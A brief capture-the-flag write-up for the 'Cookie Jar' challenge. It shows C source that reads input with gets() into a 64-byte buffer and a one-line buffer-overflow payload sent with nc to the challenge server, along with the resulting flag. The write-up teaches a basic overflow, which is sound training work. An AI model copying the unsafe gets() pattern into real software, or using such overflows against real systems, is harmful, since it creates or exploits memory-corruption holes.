### Solved by rasta_mouse

```
Try to break this Cookie Jar that was compiled from this source Once you've pwned the binary, test it out by connecting to nc shell.angstromctf.com 1234 to get the flag.
```

```
#include <stdio.h>
#include <stdlib.h>

#define FLAG "----------REDACTED----------"

int main(int argc, char **argv){
  
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	int numCookies = 0;

	char buffer[64];

	puts("Welcome to the Cookie Jar program!\n");
	puts("In order to get the flag, you will need to have 100 cookies!\n");
	puts("So, how many cookies are there in the cookie jar: ");
	fflush(stdout);
	gets(buffer);

	if (numCookies >= 100){
		printf("Congrats, you have %d cookies!\n", numCookies);
		printf("Here's your flag: %s\n", FLAG);
	} else {
		printf("Sorry, you only had %d cookies, try again!\n",numCookies);
	}
		
	return 0;
}
```

This binary is vulnerable to a buffer overflow.

```
➜  ~ python -c 'print "A" * 80' | nc shell.angstromctf.com 1234
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
Congrats, you have 1094795585 cookies!
Here's your flag: actf{eat_cookies_get_buffer}
```